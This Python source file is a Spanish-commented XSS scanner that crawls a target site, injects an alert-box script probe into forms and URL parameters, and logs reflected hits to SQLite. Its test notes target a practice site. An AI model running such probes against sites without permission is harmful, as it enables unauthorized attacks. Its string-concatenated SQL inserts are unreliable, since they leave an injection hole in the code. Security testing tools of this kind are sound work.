# -*- coding: utf-8 -*-
from queue import Queue
import queue
from tabnanny import verbose
import urllib.request
from html.parser import HTMLParser
from urllib.parse import urlparse
import sqlite3
import getopt
import sys
import threading
import time

#:::::::NOTAS AL FINAL DEL CODIGO::::::::::::

global verbose_flag 
verbose_flag = False

cola_de_trabajo = queue.Queue()

#lista FormPage
global vulnFormsFound
vulnFormsFound = []

#lista string
global vulnUrlsFound
vulnUrlsFound  = []

cookie = ""


#verificados de inyecciones
class VulnChecker:

    def __init__(self, formpage , urlvuln):
        self.urlvuln      = urlvuln
        self.formtest     = formpage 
        self.response     = ""
        self.VulnForms    = []
        self.VulnUrlFound = ""
        self.FormPageFound= ""
        self.core()
        

    def __del__(self):
        pass
    
    def core(self):
        if self.formtest != False and self.urlvuln == False:
            if verbose_flag:
                print("[*]Testeando xss contra formulario")
            try:
                for formulario in self.formtest.getForms():
                    #metodo GET
                    if formulario.getMethod().upper() == "GET":
                        if self.injectGetRequest(formulario.getPayload()):
                            if verbose_flag:
                                print("[*] Formulario GET Vulnerable!")
                            self.VulnForms.append(formulario)

                    #metodo POST
                    elif formulario.getMethod().upper() == "POST":
                        if self.injectPostRequest(formulario.getEntireAction() ,formulario.getPayload()):
                            if verbose_flag:
                                print("[*] Formulario POST Vulnerable!")
                            self.VulnForms.append(formulario)

                    #metodo no soportado PUT DELETE UPDATE
                    else:
                        print("NOT SUPPORTED METHOD")
            except Exception as ex:
                print("Oops Una Excepcion en VulnChecker!!")
                print(str(ex))

            if len(self.VulnForms) >= 1:
                self.FormPageFound = FormPage(self.formtest.getUrl(), self.VulnForms)
                
   
        elif self.formtest == False and self.urlvuln != False:
            if verbose_flag:
                print("[*]Testeando xss en url")
                
            if self.injectGetRequest(self.urlvuln):
                if verbose_flag:
                    print("[*] URL Get Vulnerable!")
                self.VulnUrlFound = self.urlvuln

        else:
            print("[*]Error en parametros VulnChecker")
            

    
            
    #genera la inyeccion mediante GET
    def injectGetRequest(self, url):
        if self.formtest != False:
            if self.formtest.getCookie() != "":
                r = urllib.request.Request(url)
                r.add_header("Cookie", self.formtest.getCookie())
                request = urllib.request.urlopen(r)
                htmlcode = str(request.read())
                return self.responseValidator(htmlcode)   
            else:
                request = urllib.request.urlopen(url)
                htmlcode = str(request.read())   
        else:
            request = urllib.request.urlopen(url)
            htmlcode = str(request.read())
            
        return self.responseValidator(htmlcode)
    
    #genera la inyeccion mediante POST
    def injectPostRequest(self, url, postParams):

        data = postParams.encode('ascii')
        if self.formtest != False:
            if self.formtest.getCookie() != "":
                r = urllib.request.Request(url)
                r.add_header("Cookie", self.formtest.getCookie())
                request = urllib.request.urlopen(r, data)
                htmlcode = str(request.read())
                return self.responseValidator(htmlcode)
            else:
                request = urllib.request.urlopen(url, data)
                htmlcode = str(request.read())
        else:
            request = urllib.request.urlopen(url, data)
            htmlcode = str(request.read())
       
        return self.responseValidator(htmlcode)
    
    #valida la respuesta a la peticion verificando si es vulnerable
    def responseValidator(self, htmlcode):
        isVulnerable = RespChecker()
        isVulnerable.feed(htmlcode)
        return isVulnerable.isVulnerable()
            
    def responseCleaner(self):
        self.response = ""
    
    def getUrlVunlFound(self):
        return self.VulnUrlFound
    
    def getVulnsFoundFP(self):
        return self.FormPageFound
            
 
    
#verificador de respuesta de inyeccion
class RespChecker(HTMLParser):
    
    def __init__(self):
        HTMLParser.__init__(self)
        self.isVuln = False
        
    def __del__(self):
        pass
    
    #busca la inyeccion ejecutada en el codigo html
    def handle_data(self, data):
        if data == "alert(\"xssvuln\")":
            self.isVuln = True
    
    def isVulnerable(self):
        return self.isVuln
                
                

#Enumerador de Urls en codigo HTML
class UrlHunter(HTMLParser):
    
    def __init__(self):
        HTMLParser.__init__(self)
        self.links = []
        self.entire_links = []
        self.url = ""

    def __del__(self):
        pass

    #analiza los tags de apertura
    def handle_starttag(self, tag, attrs):

        if tag == "a":
            for attr in attrs:
                if attr[0] == "href":
                    #omitimos los resultados dentro de la misma pagina
                    if attr[1].startswith("#"):
                        continue
                    else:
                        if self.domain_id(attr[1]) == "" or self.domain_id(attr[1]) == self.domain_id(self.url):
                            if attr[1] in self.links:
                                continue
                            else:
                                if str(attr[1])[0] == "/" :
                                    entirelink = self.urlSetter(attr[1] , self.url)
                                    if verbose_flag:
                                        print("|_", self.domain_cleaner(attr[1]))
                                        print("|-- "+entirelink)
                                        print("|")
                                    self.links.append(self.domain_cleaner(attr[1]))
                                    self.entire_links.append(entirelink)
                                    
                                else:
                                    if verbose_flag:
                                        print("|_", self.domain_cleaner(attr[1]))
                                        print("|-- "+attr[1])
                                        print("|")
                                    self.links.append(self.domain_cleaner(attr[1]))
                                    self.entire_links.append(attr[1])

    def domain_id(self, url):
        parsed = urlparse(url)
        return parsed.netloc

    #retorna el directorio/subdirectorio de la url
    def domain_cleaner(self, url):
        parsed = urlparse(url)
        return parsed.path
    
    def urlSetter(self, foundUrl, url):
        tmp = ""
        parsed = urlparse(url)
        if foundUrl[0] == "/":
            tmp += parsed.scheme+"://"+parsed.netloc+foundUrl
            return str(tmp)

    def setUrl(self, url):
        self.url = url
        print("[*]Buscando enlaces en:",self.url)
        
    def getUrl(self):
        return self.url
    
    def getLinks(self):
        return self.links
    
    def getEntireLinks(self):
        return self.entire_links
    


class Analizador:
    #Esta clase se encarga de analizar una url
    #para varificar si es vulnerable a xss
    #constructor
    #debo pasar como parametro de contructor url solamente o url + codigo html
    def __init__(self, url, htmlcode):
        self.url      = url
        self.htmlcode = htmlcode
        self.cookie   = ""
        self.urlVuln  = False
        self.urlPayl  = ""
        self.htmlcode = htmlcode
        global verbose_flag 
        global vulnFormsFound
        global vulnUrlsFound
        global cola_de_trabajo

    def __del__(self):
        pass

    def requestHtml(self):

        urlcheck = UrlWatcher(self.url)
        if urlcheck.isVulnerable():
            urlcheck.payloadGen()
            self.urlPayl = urlcheck.getPayload()
            self.urlVuln = True

        if self.htmlcode == False:
            if self.cookie != "":
                r = urllib.request.Request(url)
                r.add_header("Cookie", self.formtest.getCookie())
                request = urllib.request.urlopen(r)
                self.htmlcode = str(request.read())
            else:
                request = urllib.request.urlopen(self.url)
                self.htmlcode = str(request.read())
        
        #llamamos la urlHunter para verificar enlaces 
        urlhunter = UrlHunter()
        urlhunter.setUrl(self.url)
        urlhunter.feed(self.htmlcode)
        if len(urlhunter.getEntireLinks()) >= 1:
            for hunturl in urlhunter.getEntireLinks():
                cola_de_trabajo.put(str(hunturl))

        self.formVerify()
        
    #verifica si hay formularios
    def formVerify(self):
        parser = FormFinder()
        print("[*]Testing:",self.url)
        parser.feed(self.htmlcode)
        
        #si encuentra formularios en la url genera el objeto FormPage
        if parser.wasFound(): 
            self.foundForms = FormPage(self.url, parser.getFormsFound())
            if self.cookie != "":
                self.foundForms.setCookie(self.cookie)
            payload = PayloadGenerator(self.foundForms)
            #retornamos un objeto FormPage actualizado con el payload
            #con el objeto obtenido de payload.getFormPage() podemos iniciar los ataques a los objetivos
            #----Probamos la inyeccion---- con el payload generado
            checker = VulnChecker(payload.getFormPage(), False)
            #print(str(checker.getVulnsFoundFP()))
            if checker.getVulnsFoundFP() != "":
                print("[*]Formulario Vulnerable Encontrado\n"+ str(checker.getVulnsFoundFP()))
                vulnFormsFound.append(checker.getVulnsFoundFP())
            
        elif self.urlVuln and self.urlPayl != "":
            print("[*]Verificando inyeccion por URL")
            checker = VulnChecker(False, self.urlPayl)
            if checker.getUrlVunlFound() != "":
                if verbose_flag:
                    print("[*]Url Vulnerable encontrada\n"+str(checker.getUrlVunlFound))
                vulnUrlsFound.append(checker.getUrlVunlFound())
        else:
            print("[*]No se encontraron formularios ni urls vulnerables") 
        self.clear()   

    def setCookie(self, cookie):
        self.cookie = cookie

    def clear(self):
        self.url      = ""
        self.htmlcode = ""
        self.cookie   = ""
        self.formMeth = ""
        self.formActi = ""
        self.formFiel = []
        self.payload  = "<script>alert%28\"xssvuln\"%29<%2Fscript>"
        self.urlVuln = False
        self.urlPayl  = ""

    #setea la url para reutilizar el objeto
    def setUrl(self, url):
        self.url     = url
        
    def setCookie(self, cookie):
        self.cookie = cookie


#el papi de msfvenom ;)
#recibe como parametro un FormPage Object
class PayloadGenerator:
    def __init__(self, FormPage):
        self.cookie   = ""
        #listado de objetos FormPage
        self.forms    = FormPage
        self.payload  = "<script>alert%28\"xssvuln\"%29<%2Fscript>"
        self.formsList = ""
        self.tempForms = []
        self.tmpObject = ""
        self.core()
        global verbose_flag 
        global vulnFormsFound
        global vulnUrlsFound

    def __del__(self):
        pass
    
    #main function para determina el tipo de payload a generar
    def core(self):
         
        if self.forms != False:
            if verbose_flag:
                print("[*]Generando Payload a partir de FormPage Object")
            self.formsList = self.forms.getForms()
            try:
                for formulario in self.formsList:
                    #metodo GET
                    if formulario.getMethod().upper() == "GET":
                        if verbose_flag:
                            print("[*]GET Payload")
                        entirepayload = self.payloadConnectGet(self.forms.getUrl(),self.genFormPayload(formulario), formulario.getAction())
                        formulario.setPayload(entirepayload)
                        self.tempForms.append(formulario)
                    #metodo POST
                    elif formulario.getMethod().upper() == "POST":
                        if verbose_flag:
                            print("[*]POST Payload")
                        entirepayload = self.genFormPayload(formulario)
                        formulario.setPayload(entirepayload)
                        #agregar campo setEntireAction(url completa del action)
                        entireaction = self.payloadConnectGet(self.forms.getUrl(), "", formulario.getAction())
                        formulario.setEntireAction(entireaction)
                        self.tempForms.append(formulario)
                        
                    #metodo no soportado PUT DELETE UPDATE
                    else:
                        print("NOT SUPPORTED METHOD")
                    
            except Exception as ex:
                print("Oops Una Excepcion!! Core PayloadGenerator")
                print(str(ex))

            tmpObj = FormPage(self.forms.getUrl(), self.tempForms)
            self.tmpObject = tmpObj

        else:
            print("Error Al generar el form Payload")
            

    #concatena el payload a la url cuando el metodo es GET
    def payloadConnectGet(self, url, payload ,action):
        entire_payload = ""
        if payload != "":
            if action == "":
                if url[len(url)-1] == "?":
                    entire_payload = url+payload
                else:
                    entire_payload = url+"?"+payload         
                return entire_payload  
            else:
                if action[0] == "/":         
                    tmp = ""
                    parsed = urlparse(url)
                    tmp += parsed.scheme+"://"+parsed.netloc
                    entire_payload = tmp+action+"?"+payload
                else:
                    print("ya valimos con las rutas")
        else:
            if action == "":
                if url[len(url)-1] == "?":
                    entire_payload = url
                else:
                    entire_payload = url         
                return entire_payload  
            else:
                if action[0] == "/":         
                    tmp = ""
                    parsed = urlparse(url)
                    tmp += parsed.scheme+"://"+parsed.netloc
                    entire_payload = tmp+action
                else:
                    print("ya valimos con las rutas")

        return entire_payload


    #genera el payload para formularios GET/POST
    def genFormPayload(self, Formulario):
        tmp = ""
        if len(Formulario.getFields()) == 1:
            tmp += Formulario.getFields()[0]
            tmp += "="+self.payload
        elif len(Formulario.getFields()) > 1:
            for field in Formulario.getFields():
                if "=" in field:
                    tmp += field+"&"
                else:
                    tmp += field+"="+self.payload+"&"
        else:
            print("Fields Form Error!!!")
        #limpiador de payload multi fields
        if tmp[len(tmp)-1] == "&":
            return tmp[:-1]
        else:
            return tmp
        
    def getFormPage(self):
        return self.tmpObject
        
        
#composición de una URL + una lista de objs Formulario
class FormPage:
    def __init__(self, url, forms):
        self.url      = url
        self.cookie   = ""
        self.forms    = forms

    def __del__(self):
        pass

    def setCookie(self, cookie):
        self.cookie = cookie

    def getCookie(self):
        return self.cookie
    
    def setUrl(self, url):
        self.url = url
        
    def getUrl(self):
        return self.url
    
    def setForms(self, forms):
        self.forms = forms
        
    def getForms(self):
        return self.forms

    def __str__(self):
        tmp = "|--"+"-"*33+"\n"
        tmp += "|_[URL: "+self.url+" ]\n"
        if self.cookie != "":
            tmp += "|_[Setted Cookie: "+self.cookie+" ]\n"
            tmp += "|_FORMS LIST:\n"
        
        for formulario in self.forms:
            tmp += str(formulario)+"\n"
            
        tmp += "|_"+"_"*33
        return tmp
        
   
        
class Formulario:
    def __init__(self, method, action, fields):
        self.method = method
        self.action = action
        self.fields = fields
        self.PayloadSet = ""
        self.EntireAction = ""

    def __del__(self):
        pass
        
    def getMethod(self):
        return self.method

    def getAction(self):
        return self.action

    def getFields(self):
        return self.fields
    
    def getPayload(self):
        return self.PayloadSet
    
    def setPayload(self, payload):
        self.PayloadSet = payload
        
    def setEntireAction(self, entireaction):
        self.EntireAction = entireaction
        
    def getEntireAction(self):
        return self.EntireAction
    
    def __str__(self):
        fields = str(self.fields)
        showObject = "|_[Method="+self.method+" Action="+self.action+" Fields="+fields+"]"
        if self.EntireAction != "":
            showObject += "\n|__[Entire Action: "+self.EntireAction+"]"
        if self.PayloadSet != "":
            showObject += "\n|__[Generated Payload: "+self.PayloadSet+"]"
        return showObject
    


#analiza el codigo html xhtml en busqueda de formularios y
#puede retornar una lista con formularios
class FormFinder(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.formMeth = ""
        self.formActi = ""
        self.formAttr = []
        self.formsFound = []
        global verbose_flag 
        global vulnFormsFound
        global vulnUrlsFound
        
    def handle_starttag(self, tag, attrs):
        if tag == "form":
            for attr in attrs:
                if attr[0] == "method":
                    #verificamos badchars
                    self.formMeth = self.remplaceChars(attr[1])
                elif attr[0] == "action":
                    self.formActi = self.remplaceChars(attr[1])
                        
        elif tag == "input":
            hidden_flag = False
            tmp_name  = ""
            tmp_value = ""
            for attr in attrs:
                if attr[0] == "name":
                    tmp_name = attr[1]
                elif  attr[0] == "type" and "hidden" in attr[1]:
                    hidden_flag = True
                elif attr[0] == "value":
                    tmp_value = attr[1]
            if hidden_flag:
                tmp_name +="="+tmp_value

            if tmp_name != "":
                self.formAttr.append(self.remplaceChars(tmp_name))
            
    #reemplaza badchars 
    def remplaceChars(self, mystring):
        if "\'" in mystring:
            return mystring.replace("\\'","")
        else:
            return mystring
        
    def clearParameter(self):
        self.formMeth = ""
        self.formActi = ""
        self.formAttr = []
        
    
    def handle_endtag(self, tag):
        if tag == "form":
            flagRemove = False
            tmpObj = ""
            for attr in self.formAttr:
                if "redirect_to" in attr:
                    flagRemove = True
            if flagRemove:
                self.clearParameter()
            else:
                tmpObj = Formulario(self.formMeth, self.formActi, self.formAttr)
                self.formsFound.append(tmpObj)
            self.clearParameter()
         
    def wasFound(self):
        if len(self.formsFound) >= 1:
            return True
        else:
            return False
        
    def __str__(self):
        tmp = ""
        for formulario in self.formsFound:
            tmp += str(formulario)
        return tmp
    
    def getFormsFound(self):
        return self.formsFound



#verifica si la url obtenida podría ser vulnerable a inyeccion
class UrlWatcher:
    def __init__(self, url):
        self.url         = url
        self.payload     = "<script>alert%28\"xssvuln\"%29<%2Fscript>"        
        self.fullpayload = ""

    def __del__(self):
        pass
    
    def isVulnerable(self):
        parser = urlparse(self.url)
        tmp = parser.query
        if "&" in tmp:
            return False            
        else:
            if "?" in tmp:
                return True
            else:
                return False
        
    def payloadGen(self):
        parser = urlparse(self.url)
        tmp = parser.query
        if "&" in tmp:
            self.fullpayload = ""            
        else:
            tmp = parser.query.split("=")
            if tmp != "":
                path = parser.scheme+"://"+parser.netloc+parser.path+"?"+tmp[0]+"="+self.payload
                self.fullpayload = path
            else:
                return False
        
    def getPayload(self):
        return self.fullpayload
 
 
class DbManager:
    #pasamos como parametro el nombre de la base de datos
    def __init__(self, dbname):
        self.dbname = dbname
        self.con    = sqlite3.connect(self.dbname)
        self.cursor = self.con.cursor()
        pass
        
    def __del__(self):
        #print("Chicken Destroy")
        pass
    
    def storeFormPageList(self, FormPageList):
        self.runQuery("CREATE TABLE IF NOT EXISTS formulariosVulnerables (url TEXT, formulario TEXT)")
        for formpage in FormPageList:
            formpage_link = formpage.getUrl()
            for formulario in formpage.getForms():
                tmp = str(formulario).replace("'","")
                tmp = tmp.replace("|_[","[")
                tmp = tmp.replace("]]","]")
                self.runQuery("INSERT INTO formulariosVulnerables VALUES ('"+formpage_link+"','"+str(tmp)+"')")
            
    def storeVulnLinksList(self, vunlList):
        self.runQuery("CREATE TABLE IF NOT EXISTS linksVulnerables (link TEXT)")
        for link in vunlList:
            self.runQuery("INSERT INTO linksVulnerables VALUES ('"+link+"')")

    def runQuery(self, query):
        try:
            self.cursor.execute(query)
            self.con.commit()
            return True
        except Exception as ex:
            print("Oops Una Excepcion!! DBMAN")
            print(str(ex))
            return False
        


def worker():
    while not cola_de_trabajo.empty():
        analyst = Analizador(cola_de_trabajo.get(),False)
        if cookie != "":
            analyst.setCookie(cookie)
        analyst.requestHtml()
        

#definicion de main, enserio? :o
def main():
    
    logo()
    global url
    global nthread
    global verbose
    global cola_de_trabajo
    global verbose_flag
    url = ""
    cookie = ""
    nthread = ""
    if not len(sys.argv[1:]):
        usage()

    # lee la opciones por consola
    try:
        opts, args = getopt.getopt(sys.argv[1:],"h:u:c:t:v",["help","url","cookie","thread","verbose"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
        sys.exit(2)
        
    # se poblan los parametros disponibles   
    for o,a in opts:
        if o == "-h":
            usage()
            return 0
        elif o == "-u":
            url = a
            if "http" in a:
                cola_de_trabajo.put(a)
            else:
                usage()
                print(":::ERROR EN INGRESO DE URL:::")
                print(":::Espcificar protocolo http/https:::")
                return 0
        elif o == "-c":
            cookie = a
        elif o == "-t":
            nthread = int(a)
        elif o == "-v":
            verbose = True
            verbose_flag = True
        else:
            print("[*]Parameter Error!")

    if verbose_flag:
        parametros = ""
        if url != "":
            parametros += "Target="+url+" | "
        if cookie != "":
            parametros += "Cookie:"+cookie+" | "
        if nthread != "":
            parametros += "Threads="+str(nthread)+"\n"
        print(str(parametros))
    
    if nthread != "":
        for i in range(nthread):
            if verbose_flag:
                print("[*]Generando worker: ["+str(i)+"]")
            t = threading.Thread(target=worker)
            t.start()
        
        
    else:
        print("[*]Ejecutando sin hilos")
        worker()
    
    #db man
    db = DbManager("results")
    if len(vulnFormsFound) >= 1:
        print("\n[*] Almacenando resultados en la bd")
        db.storeFormPageList(vulnFormsFound)
    if len(vulnUrlsFound) >= 1 :
        db.storeVulnLinksList(vulnUrlsFound)
        print("\n[*] Almacenando resultados en la bd")
    

def domain_id(url):
    parsed = urlparse(url)
    return parsed.netloc

def usage():
    send_help = """::::::::::::::::XSScan v1.0 (c) by Jaime Muñoz R:::::::::::::::::::::::

Syntax: xsscan.py  -u <URL> -t <Threads> -c <Cookie> -v <Verbose>
Optional Parameters: [ -t | -c ]

OPTIONS
-u URL	    Especifies the target URL
		Example: -u http://www.mysite.com
		 	 -u https://www.mysite.com
-t THREADS  Especifies the number of threads that will run the program
		Example: -t 12
-c COOKIE   Especifies the cookie value to a target, does not require specifying 'Cookie:'
		Example: -c 'usr=mrjames; passwd=pwned'
-v VERBOSE  Enable de Verbose Mode """
    print(send_help)
    print("\n")


# el logo xd
def logo():
    
    img = """------------------------------------------------------------------------------
------------------------------------------------------------------------------
███╗   ███╗██████╗              ██╗██╗  ██╗███╗   ███╗██████╗ ██████╗ ███████╗
████╗ ████║██╔══██╗             ██║██║  ██║████╗ ████║╚════██╗╚════██╗██╔════╝
██╔████╔██║██████╔╝             ██║███████║██╔████╔██║ █████╔╝ █████╔╝███████╗
██║╚██╔╝██║██╔══██╗        ██   ██║╚════██║██║╚██╔╝██║ ╚═══██╗ ╚═══██╗╚════██║
██║ ╚═╝ ██║██║  ██║███████╗╚█████╔╝     ██║██║ ╚═╝ ██║██████╔╝██████╔╝███████║
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚════╝      ╚═╝╚═╝     ╚═╝╚═════╝ ╚═════╝ ╚══════╝
------------------------XSS Scanner JaimeMuñozR-------------------------------
-------------------------01-07-2022--07-07-2022-------------------------------"""
    print(img)
    print()




main()


"""
NOTAS DE PRUEBAS

-Desarrollado en python version 3.10
-Testeado en windows

sugerencias de testeo

dependiendo del $PATH emplear python3 o simplemente python

python xssscanner.py 
python xssscanner.py -h
python xssscanner.py -u https://xss-game.appspot.com -t 2 -h
python xssscanner.py -u https://xss-game.appspot.com -t 2 
python xssscanner.py -u https://xss-game.appspot.com -t 2 -v
python xssscanner.py -u https://xss-game.appspot.com/level1/frame -t 2 -v
python xssscanner.py -u https://xss-game.appspot.com/level1/frame -t 2 -c clave=valor -v
python xssscanner.py -u https://xss-game.appspot.com/level1/frame -t 2 -c clave=valor 
python xssscanner.py -u https://xss-game.appspot.com/level1/frame -t 2 -c clave=valor;cookievalue2=valor -v
    
"""

